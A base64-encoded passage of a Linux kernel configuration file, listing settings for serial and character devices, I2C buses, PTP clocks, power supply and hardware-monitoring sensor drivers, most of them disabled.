IHNldAojIENPTkZJR19TRVJJT19BUkNfUFMyIGlzIG5vdCBzZXQKIyBDT05GSUdfVVNFUklPIGlz
IG5vdCBzZXQKIyBDT05GSUdfR0FNRVBPUlQgaXMgbm90IHNldAojIGVuZCBvZiBIYXJkd2FyZSBJ
L08gcG9ydHMKIyBlbmQgb2YgSW5wdXQgZGV2aWNlIHN1cHBvcnQKCiMKIyBDaGFyYWN0ZXIgZGV2
aWNlcwojCkNPTkZJR19UVFk9eQpDT05GSUdfVlQ9eQpDT05GSUdfQ09OU09MRV9UUkFOU0xBVElP
TlM9eQpDT05GSUdfVlRfQ09OU09MRT15CkNPTkZJR19WVF9DT05TT0xFX1NMRUVQPXkKIyBDT05G
SUdfVlRfSFdfQ09OU09MRV9CSU5ESU5HIGlzIG5vdCBzZXQKQ09ORklHX1VOSVg5OF9QVFlTPXkK
IyBDT05GSUdfTEVHQUNZX1BUWVMgaXMgbm90IHNldApDT05GSUdfTEVHQUNZX1RJT0NTVEk9eQpD
T05GSUdfTERJU0NfQVVUT0xPQUQ9eQoKIwojIFNlcmlhbCBkcml2ZXJzCiMKQ09ORklHX1NFUklB
TF9FQVJMWUNPTj15CkNPTkZJR19TRVJJQUxfODI1MD15CkNPTkZJR19TRVJJQUxfODI1MF9ERVBS
RUNBVEVEX09QVElPTlM9eQpDT05GSUdfU0VSSUFMXzgyNTBfUE5QPXkKIyBDT05GSUdfU0VSSUFM
XzgyNTBfMTY1NTBBX1ZBUklBTlRTIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VSSUFMXzgyNTBfRklO
VEVLIGlzIG5vdCBzZXQKQ09ORklHX1NFUklBTF84MjUwX0NPTlNPTEU9eQpDT05GSUdfU0VSSUFM
XzgyNTBfRE1BPXkKQ09ORklHX1NFUklBTF84MjUwX1BDSUxJQj15CkNPTkZJR19TRVJJQUxfODI1
MF9QQ0k9eQpDT05GSUdfU0VSSUFMXzgyNTBfRVhBUj15CiMgQ09ORklHX1NFUklBTF84MjUwX0NT
IGlzIG5vdCBzZXQKQ09ORklHX1NFUklBTF84MjUwX05SX1VBUlRTPTMyCkNPTkZJR19TRVJJQUxf
ODI1MF9SVU5USU1FX1VBUlRTPTQKQ09ORklHX1NFUklBTF84MjUwX0VYVEVOREVEPXkKQ09ORklH
X1NFUklBTF84MjUwX01BTllfUE9SVFM9eQojIENPTkZJR19TRVJJQUxfODI1MF9QQ0kxWFhYWCBp
cyBub3Qgc2V0CkNPTkZJR19TRVJJQUxfODI1MF9TSEFSRV9JUlE9eQpDT05GSUdfU0VSSUFMXzgy
NTBfREVURUNUX0lSUT15CkNPTkZJR19TRVJJQUxfODI1MF9SU0E9eQpDT05GSUdfU0VSSUFMXzgy
NTBfRFdMSUI9eQojIENPTkZJR19TRVJJQUxfODI1MF9EVyBpcyBub3Qgc2V0CiMgQ09ORklHX1NF
UklBTF84MjUwX1JUMjg4WCBpcyBub3Qgc2V0CkNPTkZJR19TRVJJQUxfODI1MF9MUFNTPXkKQ09O
RklHX1NFUklBTF84MjUwX01JRD15CkNPTkZJR19TRVJJQUxfODI1MF9QRVJJQ09NPXkKCiMKIyBO
b24tODI1MCBzZXJpYWwgcG9ydCBzdXBwb3J0CiMKIyBDT05GSUdfU0VSSUFMX1VBUlRMSVRFIGlz
IG5vdCBzZXQKQ09ORklHX1NFUklBTF9DT1JFPXkKQ09ORklHX1NFUklBTF9DT1JFX0NPTlNPTEU9
eQojIENPTkZJR19TRVJJQUxfSlNNIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VSSUFMX0xBTlRJUSBp
cyBub3Qgc2V0CiMgQ09ORklHX1NFUklBTF9TQ0NOWFAgaXMgbm90IHNldAojIENPTkZJR19TRVJJ
QUxfU0MxNklTN1hYIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VSSUFMX0FMVEVSQV9KVEFHVUFSVCBp
cyBub3Qgc2V0CiMgQ09ORklHX1NFUklBTF9BTFRFUkFfVUFSVCBpcyBub3Qgc2V0CiMgQ09ORklH
X1NFUklBTF9BUkMgaXMgbm90IHNldAojIENPTkZJR19TRVJJQUxfUlAyIGlzIG5vdCBzZXQKIyBD
T05GSUdfU0VSSUFMX0ZTTF9MUFVBUlQgaXMgbm90IHNldAojIENPTkZJR19TRVJJQUxfRlNMX0xJ
TkZMRVhVQVJUIGlzIG5vdCBzZXQKIyBlbmQgb2YgU2VyaWFsIGRyaXZlcnMKCkNPTkZJR19TRVJJ
QUxfTk9OU1RBTkRBUkQ9eQojIENPTkZJR19NT1hBX0lOVEVMTElPIGlzIG5vdCBzZXQKIyBDT05G
SUdfTU9YQV9TTUFSVElPIGlzIG5vdCBzZXQKIyBDT05GSUdfTl9IRExDIGlzIG5vdCBzZXQKIyBD
T05GSUdfSVBXSVJFTEVTUyBpcyBub3Qgc2V0CiMgQ09ORklHX05fR1NNIGlzIG5vdCBzZXQKIyBD
T05GSUdfTk9aT01JIGlzIG5vdCBzZXQKIyBDT05GSUdfTlVMTF9UVFkgaXMgbm90IHNldApDT05G
SUdfSFZDX0RSSVZFUj15CiMgQ09ORklHX1NFUklBTF9ERVZfQlVTIGlzIG5vdCBzZXQKQ09ORklH
X1ZJUlRJT19DT05TT0xFPXkKIyBDT05GSUdfSVBNSV9IQU5ETEVSIGlzIG5vdCBzZXQKQ09ORklH
X0hXX1JBTkRPTT15CiMgQ09ORklHX0hXX1JBTkRPTV9USU1FUklPTUVNIGlzIG5vdCBzZXQKIyBD
T05GSUdfSFdfUkFORE9NX0lOVEVMIGlzIG5vdCBzZXQKIyBDT05GSUdfSFdfUkFORE9NX0FNRCBp
cyBub3Qgc2V0CiMgQ09ORklHX0hXX1JBTkRPTV9CQTQzMSBpcyBub3Qgc2V0CkNPTkZJR19IV19S
QU5ET01fVklBPXkKIyBDT05GSUdfSFdfUkFORE9NX1ZJUlRJTyBpcyBub3Qgc2V0CiMgQ09ORklH
X0hXX1JBTkRPTV9YSVBIRVJBIGlzIG5vdCBzZXQKIyBDT05GSUdfQVBQTElDT00gaXMgbm90IHNl
dAojIENPTkZJR19NV0FWRSBpcyBub3Qgc2V0CkNPTkZJR19ERVZNRU09eQpDT05GSUdfTlZSQU09
eQpDT05GSUdfREVWUE9SVD15CkNPTkZJR19IUEVUPXkKIyBDT05GSUdfSFBFVF9NTUFQIGlzIG5v
dCBzZXQKIyBDT05GSUdfSEFOR0NIRUNLX1RJTUVSIGlzIG5vdCBzZXQKIyBDT05GSUdfVENHX1RQ
TSBpcyBub3Qgc2V0CiMgQ09ORklHX1RFTENMT0NLIGlzIG5vdCBzZXQKIyBDT05GSUdfWElMTFlC
VVMgaXMgbm90IHNldAojIENPTkZJR19YSUxMWVVTQiBpcyBub3Qgc2V0CiMgZW5kIG9mIENoYXJh
Y3RlciBkZXZpY2VzCgojCiMgSTJDIHN1cHBvcnQKIwpDT05GSUdfSTJDPXkKQ09ORklHX0FDUElf
STJDX09QUkVHSU9OPXkKQ09ORklHX0kyQ19CT0FSRElORk89eQpDT05GSUdfSTJDX0NPTVBBVD15
CiMgQ09ORklHX0kyQ19DSEFSREVWIGlzIG5vdCBzZXQKIyBDT05GSUdfSTJDX01VWCBpcyBub3Qg
c2V0CkNPTkZJR19JMkNfSEVMUEVSX0FVVE89eQpDT05GSUdfSTJDX1NNQlVTPXkKQ09ORklHX0ky
Q19BTEdPQklUPXkKCiMKIyBJMkMgSGFyZHdhcmUgQnVzIHN1cHBvcnQKIwoKIwojIFBDIFNNQnVz
IGhvc3QgY29udHJvbGxlciBkcml2ZXJzCiMKIyBDT05GSUdfSTJDX0FMSTE1MzUgaXMgbm90IHNl
dAojIENPTkZJR19JMkNfQUxJMTU2MyBpcyBub3Qgc2V0CiMgQ09ORklHX0kyQ19BTEkxNVgzIGlz
IG5vdCBzZXQKIyBDT05GSUdfSTJDX0FNRDc1NiBpcyBub3Qgc2V0CiMgQ09ORklHX0kyQ19BTUQ4
MTExIGlzIG5vdCBzZXQKIyBDT05GSUdfSTJDX0FNRF9NUDIgaXMgbm90IHNldApDT05GSUdfSTJD
X0k4MDE9eQojIENPTkZJR19JMkNfSVNDSCBpcyBub3Qgc2V0CiMgQ09ORklHX0kyQ19JU01UIGlz
IG5vdCBzZXQKIyBDT05GSUdfSTJDX1BJSVg0IGlzIG5vdCBzZXQKIyBDT05GSUdfSTJDX05GT1JD
RTIgaXMgbm90IHNldAojIENPTkZJR19JMkNfTlZJRElBX0dQVSBpcyBub3Qgc2V0CiMgQ09ORklH
X0kyQ19TSVM1NTk1IGlzIG5vdCBzZXQKIyBDT05GSUdfSTJDX1NJUzYzMCBpcyBub3Qgc2V0CiMg
Q09ORklHX0kyQ19TSVM5NlggaXMgbm90IHNldAojIENPTkZJR19JMkNfVklBIGlzIG5vdCBzZXQK
IyBDT05GSUdfSTJDX1ZJQVBSTyBpcyBub3Qgc2V0CiMgQ09ORklHX0kyQ19aSEFPWElOIGlzIG5v
dCBzZXQKCiMKIyBBQ1BJIGRyaXZlcnMKIwojIENPTkZJR19JMkNfU0NNSSBpcyBub3Qgc2V0Cgoj
CiMgSTJDIHN5c3RlbSBidXMgZHJpdmVycyAobW9zdGx5IGVtYmVkZGVkIC8gc3lzdGVtLW9uLWNo
aXApCiMKIyBDT05GSUdfSTJDX0RFU0lHTldBUkVfUENJIGlzIG5vdCBzZXQKIyBDT05GSUdfSTJD
X09DT1JFUyBpcyBub3Qgc2V0CiMgQ09ORklHX0kyQ19QQ0FfUExBVEZPUk0gaXMgbm90IHNldAoj
IENPTkZJR19JMkNfU0lNVEVDIGlzIG5vdCBzZXQKIyBDT05GSUdfSTJDX1hJTElOWCBpcyBub3Qg
c2V0CgojCiMgRXh0ZXJuYWwgSTJDL1NNQnVzIGFkYXB0ZXIgZHJpdmVycwojCiMgQ09ORklHX0ky
Q19ESU9MQU5fVTJDIGlzIG5vdCBzZXQKIyBDT05GSUdfSTJDX0NQMjYxNSBpcyBub3Qgc2V0CiMg
Q09ORklHX0kyQ19QQ0kxWFhYWCBpcyBub3Qgc2V0CiMgQ09ORklHX0kyQ19ST0JPVEZVWlpfT1NJ
RiBpcyBub3Qgc2V0CiMgQ09ORklHX0kyQ19UQU9TX0VWTSBpcyBub3Qgc2V0CiMgQ09ORklHX0ky
Q19USU5ZX1VTQiBpcyBub3Qgc2V0CgojCiMgT3RoZXIgSTJDL1NNQnVzIGJ1cyBkcml2ZXJzCiMK
IyBDT05GSUdfSTJDX01MWENQTEQgaXMgbm90IHNldAojIENPTkZJR19JMkNfVklSVElPIGlzIG5v
dCBzZXQKIyBlbmQgb2YgSTJDIEhhcmR3YXJlIEJ1cyBzdXBwb3J0CgojIENPTkZJR19JMkNfU1RV
QiBpcyBub3Qgc2V0CiMgQ09ORklHX0kyQ19TTEFWRSBpcyBub3Qgc2V0CiMgQ09ORklHX0kyQ19E
RUJVR19DT1JFIGlzIG5vdCBzZXQKIyBDT05GSUdfSTJDX0RFQlVHX0FMR08gaXMgbm90IHNldAoj
IENPTkZJR19JMkNfREVCVUdfQlVTIGlzIG5vdCBzZXQKIyBlbmQgb2YgSTJDIHN1cHBvcnQKCiMg
Q09ORklHX0kzQyBpcyBub3Qgc2V0CiMgQ09ORklHX1NQSSBpcyBub3Qgc2V0CiMgQ09ORklHX1NQ
TUkgaXMgbm90IHNldAojIENPTkZJR19IU0kgaXMgbm90IHNldApDT05GSUdfUFBTPXkKIyBDT05G
SUdfUFBTX0RFQlVHIGlzIG5vdCBzZXQKCiMKIyBQUFMgY2xpZW50cyBzdXBwb3J0CiMKIyBDT05G
SUdfUFBTX0NMSUVOVF9LVElNRVIgaXMgbm90IHNldAojIENPTkZJR19QUFNfQ0xJRU5UX0xESVND
IGlzIG5vdCBzZXQKIyBDT05GSUdfUFBTX0NMSUVOVF9HUElPIGlzIG5vdCBzZXQKCiMKIyBQUFMg
Z2VuZXJhdG9ycyBzdXBwb3J0CiMKCiMKIyBQVFAgY2xvY2sgc3VwcG9ydAojCkNPTkZJR19QVFBf
MTU4OF9DTE9DSz15CkNPTkZJR19QVFBfMTU4OF9DTE9DS19PUFRJT05BTD15CgojCiMgRW5hYmxl
IFBIWUxJQiBhbmQgTkVUV09SS19QSFlfVElNRVNUQU1QSU5HIHRvIHNlZSB0aGUgYWRkaXRpb25h
bCBjbG9ja3MuCiMKQ09ORklHX1BUUF8xNTg4X0NMT0NLX0tWTT15CiMgQ09ORklHX1BUUF8xNTg4
X0NMT0NLX0lEVDgyUDMzIGlzIG5vdCBzZXQKIyBDT05GSUdfUFRQXzE1ODhfQ0xPQ0tfSURUQ00g
aXMgbm90IHNldAojIENPTkZJR19QVFBfMTU4OF9DTE9DS19GQzNXIGlzIG5vdCBzZXQKIyBDT05G
SUdfUFRQXzE1ODhfQ0xPQ0tfTU9DSyBpcyBub3Qgc2V0CiMgQ09ORklHX1BUUF8xNTg4X0NMT0NL
X1ZNVyBpcyBub3Qgc2V0CiMgZW5kIG9mIFBUUCBjbG9jayBzdXBwb3J0CgojIENPTkZJR19QSU5D
VFJMIGlzIG5vdCBzZXQKIyBDT05GSUdfR1BJT0xJQiBpcyBub3Qgc2V0CiMgQ09ORklHX1cxIGlz
IG5vdCBzZXQKIyBDT05GSUdfUE9XRVJfUkVTRVQgaXMgbm90IHNldAojIENPTkZJR19QT1dFUl9T
RVFVRU5DSU5HIGlzIG5vdCBzZXQKQ09ORklHX1BPV0VSX1NVUFBMWT15CiMgQ09ORklHX1BPV0VS
X1NVUFBMWV9ERUJVRyBpcyBub3Qgc2V0CkNPTkZJR19QT1dFUl9TVVBQTFlfSFdNT049eQojIENP
TkZJR19JUDVYWFhfUE9XRVIgaXMgbm90IHNldAojIENPTkZJR19URVNUX1BPV0VSIGlzIG5vdCBz
ZXQKIyBDT05GSUdfQ0hBUkdFUl9BRFA1MDYxIGlzIG5vdCBzZXQKIyBDT05GSUdfQkFUVEVSWV9D
VzIwMTUgaXMgbm90IHNldAojIENPTkZJR19CQVRURVJZX0RTMjc4MCBpcyBub3Qgc2V0CiMgQ09O
RklHX0JBVFRFUllfRFMyNzgxIGlzIG5vdCBzZXQKIyBDT05GSUdfQkFUVEVSWV9EUzI3ODIgaXMg
bm90IHNldAojIENPTkZJR19CQVRURVJZX1NBTVNVTkdfU0RJIGlzIG5vdCBzZXQKIyBDT05GSUdf
QkFUVEVSWV9TQlMgaXMgbm90IHNldAojIENPTkZJR19DSEFSR0VSX1NCUyBpcyBub3Qgc2V0CiMg
Q09ORklHX0JBVFRFUllfQlEyN1hYWCBpcyBub3Qgc2V0CiMgQ09ORklHX0JBVFRFUllfTUFYMTcw
NDIgaXMgbm90IHNldAojIENPTkZJR19CQVRURVJZX01BWDE3MjBYIGlzIG5vdCBzZXQKIyBDT05G
SUdfQ0hBUkdFUl9NQVg4OTAzIGlzIG5vdCBzZXQKIyBDT05GSUdfQ0hBUkdFUl9MUDg3MjcgaXMg
bm90IHNldAojIENPTkZJR19DSEFSR0VSX0xUQzQxNjJMIGlzIG5vdCBzZXQKIyBDT05GSUdfQ0hB
UkdFUl9NQVg3Nzk3NiBpcyBub3Qgc2V0CiMgQ09ORklHX0NIQVJHRVJfQlEyNDE1WCBpcyBub3Qg
c2V0CiMgQ09ORklHX0JBVFRFUllfR0FVR0VfTFRDMjk0MSBpcyBub3Qgc2V0CiMgQ09ORklHX0JB
VFRFUllfR09MREZJU0ggaXMgbm90IHNldAojIENPTkZJR19CQVRURVJZX1JUNTAzMyBpcyBub3Qg
c2V0CiMgQ09ORklHX0NIQVJHRVJfQkQ5OTk1NCBpcyBub3Qgc2V0CiMgQ09ORklHX0JBVFRFUllf
VUczMTA1IGlzIG5vdCBzZXQKIyBDT05GSUdfRlVFTF9HQVVHRV9NTTgwMTMgaXMgbm90IHNldApD
T05GSUdfSFdNT049eQojIENPTkZJR19IV01PTl9ERUJVR19DSElQIGlzIG5vdCBzZXQKCiMKIyBO
YXRpdmUgZHJpdmVycwojCiMgQ09ORklHX1NFTlNPUlNfQUJJVFVHVVJVIGlzIG5vdCBzZXQKIyBD
T05GSUdfU0VOU09SU19BQklUVUdVUlUzIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19BRDc0
MTQgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX0FENzQxOCBpcyBub3Qgc2V0CiMgQ09ORklH
X1NFTlNPUlNfQURNMTAyNSBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfQURNMTAyNiBpcyBu
b3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfQURNMTAyOSBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNP
UlNfQURNMTAzMSBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfQURNMTE3NyBpcyBub3Qgc2V0
CiMgQ09ORklHX1NFTlNPUlNfQURNOTI0MCBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfQURU
NzQxMCBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfQURUNzQxMSBpcyBub3Qgc2V0CiMgQ09O
RklHX1NFTlNPUlNfQURUNzQ2MiBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfQURUNzQ3MCBp
cyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfQURUNzQ3NSBpcyBub3Qgc2V0CiMgQ09ORklHX1NF
TlNPUlNfQUhUMTAgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX0FRVUFDT01QVVRFUl9ENU5F
WFQgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX0FTMzcwIGlzIG5vdCBzZXQKIyBDT05GSUdf
U0VOU09SU19BU0M3NjIxIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19BU1VTX1JPR19SWVVK
SU4gaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX0FYSV9GQU5fQ09OVFJPTCBpcyBub3Qgc2V0
CiMgQ09ORklHX1NFTlNPUlNfSzhURU1QIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19LMTBU
RU1QIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19GQU0xNUhfUE9XRVIgaXMgbm90IHNldAoj
IENPTkZJR19TRU5TT1JTX0FQUExFU01DIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19BU0Ix
MDAgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX0FUWFAxIGlzIG5vdCBzZXQKIyBDT05GSUdf
U0VOU09SU19DSElQQ0FQMiBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfQ09SU0FJUl9DUFJP
IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19DT1JTQUlSX1BTVSBpcyBub3Qgc2V0CiMgQ09O
RklHX1NFTlNPUlNfRFJJVkVURU1QIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19EUzYyMCBp
cyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfRFMxNjIxIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VO
U09SU19ERUxMX1NNTSBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfSTVLX0FNQiBpcyBub3Qg
c2V0CiMgQ09ORklHX1NFTlNPUlNfRjcxODA1RiBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNf
RjcxODgyRkcgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX0Y3NTM3NVMgaXMgbm90IHNldAoj
IENPTkZJR19TRU5TT1JTX0ZTQ0hNRCBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfRlRTVEVV
VEFURVMgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX0dJR0FCWVRFX1dBVEVSRk9SQ0UgaXMg
bm90IHNldAojIENPTkZJR19TRU5TT1JTX0dMNTE4U00gaXMgbm90IHNldAojIENPTkZJR19TRU5T
T1JTX0dMNTIwU00gaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX0c3NjBBIGlzIG5vdCBzZXQK
IyBDT05GSUdfU0VOU09SU19HNzYyIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19ISUg2MTMw
IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19IUzMwMDEgaXMgbm90IHNldAojIENPTkZJR19T
RU5TT1JTX0k1NTAwIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19DT1JFVEVNUCBpcyBub3Qg
c2V0CiMgQ09ORklHX1NFTlNPUlNfSVQ4NyBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfSkM0
MiBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfUE9XRVJaIGlzIG5vdCBzZXQKIyBDT05GSUdf
U0VOU09SU19QT1dSMTIyMCBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfTEVOT1ZPX0VDIGlz
IG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19MSU5FQUdFIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VO
U09SU19MVEMyOTQ1IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19MVEMyOTQ3X0kyQyBpcyBu
b3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfTFRDMjk5MCBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNP
UlNfTFRDMjk5MSBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfTFRDNDE1MSBpcyBub3Qgc2V0
CiMgQ09ORklHX1NFTlNPUlNfTFRDNDIxNSBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfTFRD
NDIyMiBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfTFRDNDI0NSBpcyBub3Qgc2V0CiMgQ09O
RklHX1NFTlNPUlNfTFRDNDI2MCBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfTFRDNDI2MSBp
cyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfTFRDNDI4MiBpcyBub3Qgc2V0CiMgQ09ORklHX1NF
TlNPUlNfTUFYMTI3IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19NQVgxNjA2NSBpcyBub3Qg
c2V0CiMgQ09ORklHX1NFTlNPUlNfTUFYMTYxOSBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNf
TUFYMTY2OCBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfTUFYMTk3IGlzIG5vdCBzZXQKIyBD
T05GSUdfU0VOU09SU19NQVgzMTczMCBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfTUFYMzE3
NjAgaXMgbm90IHNldAojIENPTkZJR19NQVgzMTgyNyBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNP
UlNfTUFYNjYyMCBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfTUFYNjYyMSBpcyBub3Qgc2V0
CiMgQ09ORklHX1NFTlNPUlNfTUFYNjYzOSBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfTUFY
NjY1MCBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfTUFYNjY5NyBpcyBub3Qgc2V0CiMgQ09O
RklHX1NFTlNPUlNfTUFYMzE3OTAgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX01DMzRWUjUw
MCBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfTUNQMzAyMSBpcyBub3Qgc2V0CiMgQ09ORklH
X1NFTlNPUlNfVEM2NTQgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX1RQUzIzODYxIGlzIG5v
dCBzZXQKIyBDT05GSUdfU0VOU09SU19NUjc1MjAzIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09S
U19MTTYzIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19MTTczIGlzIG5vdCBzZXQKIyBDT05G
SUdfU0VOU09SU19MTTc1IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19MTTc3IGlzIG5vdCBz
ZXQKIyBDT05GSUdfU0VOU09SU19MTTc4IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19MTTgw
IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19MTTgzIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VO
U09SU19MTTg1IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19MTTg3IGlzIG5vdCBzZXQKIyBD
T05GSUdfU0VOU09SU19MTTkwIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19MTTkyIGlzIG5v
dCBzZXQKIyBDT05GSUdfU0VOU09SU19MTTkzIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19M
TTk1MjM0IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19MTTk1MjQxIGlzIG5vdCBzZXQKIyBD
T05GSUdfU0VOU09SU19MTTk1MjQ1IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19QQzg3MzYw
IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19QQzg3NDI3IGlzIG5vdCBzZXQKIyBDT05GSUdf
U0VOU09SU19OQ1Q2NjgzIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19OQ1Q2Nzc1IGlzIG5v
dCBzZXQKIyBDT05GSUdfU0VOU09SU19OQ1Q2Nzc1X0kyQyBpcyBub3Qgc2V0CiMgQ09ORklHX1NF
TlNPUlNfTkNUNzgwMiBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfTkNUNzkwNCBpcyBub3Qg
c2V0CiMgQ09ORklHX1NFTlNPUlNfTlBDTTdYWCBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNf
TlpYVF9LUkFLRU4yIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19OWlhUX0tSQUtFTjMgaXMg
bm90IHNldAojIENPTkZJR19TRU5TT1JTX05aWFRfU01BUlQyIGlzIG5vdCBzZXQKIyBDT05GSUdf
U0VOU09SU19PQ0NfUDhfSTJDIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19PWFAgaXMgbm90
IHNldAojIENPTkZJR19TRU5TT1JTX1BDRjg1OTEgaXMgbm90IHNldAojIENPTkZJR19QTUJVUyBp
cyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfUFQ1MTYxTCBpcyBub3Qgc2V0CiMgQ09ORklHX1NF
TlNPUlNfU0JUU0kgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX1NCUk1JIGlzIG5vdCBzZXQK
IyBDT05GSUdfU0VOU09SU19TSFQyMSBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfU0hUM3gg
aXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX1NIVDR4IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VO
U09SU19TSFRDMSBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfU0lTNTU5NSBpcyBub3Qgc2V0
CiMgQ09ORklHX1NFTlNPUlNfRE1FMTczNyBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfRU1D
MTQwMyBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfRU1DMjEwMyBpcyBub3Qgc2V0CiMgQ09O
RklHX1NFTlNPUlNfRU1DMjMwNSBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfRU1DNlcyMDEg
aXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX1NNU0M0N00xIGlzIG5vdCBzZXQKIyBDT05GSUdf
U0VOU09SU19TTVNDNDdNMTkyIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19TTVNDNDdCMzk3
IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19TQ0g1NjI3IGlzIG5vdCBzZXQKIyBDT05GSUdf
U0VOU09SU19TQ0g1NjM2IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19TVFRTNzUxIGlzIG5v
dCBzZXQKIyBDT05GSUdfU0VOU09SU19BREMxMjhEODE4IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VO
U09SU19BRFM3ODI4IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19BTUM2ODIxIGlzIG5vdCBz
ZXQKIyBDT05GSUdfU0VOU09SU19JTkEyMDkgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX0lO
QTJYWCBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfSU5BMjM4IGlzIG5vdCBzZXQKIyBDT05G
SUdfU0VOU09SU19JTkEzMjIxIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19TUEQ1MTE4IGlz
IG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19UQzc0IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09S
U19USE1DNTAgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX1RNUDEwMiBpcyBub3Qgc2V0CiMg
Q09ORklHX1NFTlNPUlNfVE1QMTAzIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19UTVAxMDgg
aXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX1RNUDQwMSBpcyBub3Qgc2V0CiMgQ09ORklHX1NF
TlNPUlNfVE1QNDIxIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19UTVA0NjQgaXMgbm90IHNl
